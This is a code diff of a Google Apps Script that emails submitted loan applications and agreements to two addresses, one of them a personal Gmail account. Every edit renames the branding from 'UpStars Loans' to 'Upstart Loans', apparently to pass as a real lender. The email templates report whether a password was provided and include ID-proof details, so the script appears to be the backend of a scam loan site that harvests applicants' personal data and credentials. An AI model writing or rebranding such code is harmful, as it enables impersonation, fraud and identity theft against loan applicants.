@@ -1,4 +1,4 @@
-// Updated Google Apps Script for UpStars Loans
+// Updated Google Apps Script for Upstart Loans
 // Enhanced to include all new fields: Loan Agent, Loan Term, Loan Purpose, Monthly Payment
 // Sends emails to both addresses simultaneously
 
@@ -8,7 +8,7 @@ const SECONDARY_EMAIL = "cookebony96@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
-    <h1>UpStars Loans Email Service</h1>
+    <h1>Upstart Loans Email Service</h1>
     <p>Enhanced script is running. Ready to receive loan applications and agreements.</p>
     <p><strong>Current emails:</strong></p>
     <ul>
@@ -69,7 +69,7 @@ function handleLoanAgreement(data) {
 
 function sendEmailToBoth(subject, htmlBody, textBody) {
   const options = {
-    name: 'UpStars Loans',
+    name: 'Upstart Loans',
     htmlBody: htmlBody,
     replyTo: PRIMARY_EMAIL
   };
@@ -100,7 +100,7 @@ function createApplicationEmailHTML(data) {
     <body>
       <div class="header">
         <h1>🏦 New Loan Application Received</h1>
-        <p>UpStars Loans - Application Submitted</p>
+        <p>Upstart Loans - Application Submitted</p>
       </div>
       
       <div class="content">
@@ -182,8 +182,8 @@ function createApplicationEmailHTML(data) {
       </div>
       
       <div class="footer">
-        <p>This is an automated message from UpStars Loans Application System</p>
-        <p>© 2024 UpStars Loans. All rights reserved.</p>
+        <p>This is an automated message from Upstart Loans Application System</p>
+        <p>© 2024 Upstart Loans. All rights reserved.</p>
       </div>
     </body>
     </html>
@@ -192,7 +192,7 @@ function createApplicationEmailHTML(data) {
 
 function createApplicationEmailText(data) {
   return `
-NEW LOAN APPLICATION - UPSTARS LOANS
+NEW LOAN APPLICATION - Upstart Loans
 
 ==========================================
 Applicant Information:
@@ -225,7 +225,7 @@ Password: ${data.password ? '[PROVIDED]' : '[NOT PROVIDED]'}
 Submission Date: ${new Date().toLocaleString()}
 
 ==========================================
-This is an automated message from UpStars Loans Application System
+This is an automated message from Upstart Loans Application System
   `;
 }
 
@@ -269,7 +269,7 @@ function createAgreementEmailHTML(data) {
     <body>
       <div class="header">
         <h1>📋 Loan Agreement Submitted</h1>
-        <p>UpStars Loans - Agreement Received</p>
+        <p>Upstart Loans - Agreement Received</p>
       </div>
       
       <div class="content">
@@ -324,8 +324,8 @@ function createAgreementEmailHTML(data) {
       </div>
       
       <div class="footer">
-        <p>This is an automated message from UpStars Loans Agreement System</p>
-        <p>© 2024 UpStars Loans. All rights reserved.</p>
+        <p>This is an automated message from Upstart Loans Agreement System</p>
+        <p>© 2024 Upstart Loans. All rights reserved.</p>
       </div>
     </body>
     </html>
@@ -345,7 +345,7 @@ ID Proof Information:
   `;
 
   return `
-LOAN AGREEMENT SUBMITTED - UPSTARS LOANS
+LOAN AGREEMENT SUBMITTED - Upstart Loans
 ==========================================
 
 Borrower Information:
@@ -370,7 +370,7 @@ Agreement Content:
 The complete agreement text has been included in this submission.
 
 ==========================================
-This is an automated message from UpStars Loans Agreement System
+This is an automated message from Upstart Loans Agreement System
   `;
 }
 
@@ -386,9 +386,9 @@ function calculateMonthlyPayment(loanAmount, loanTerm) {
 }
 
 function sendErrorEmail(error, data) {
-  const subject = 'Error in UpStars Loans System';
+  const subject = 'Error in Upstart Loans System';
   const body = `
-An error occurred in the UpStars Loans system:
+An error occurred in the Upstart Loans system:
 
 Error: ${error}
 
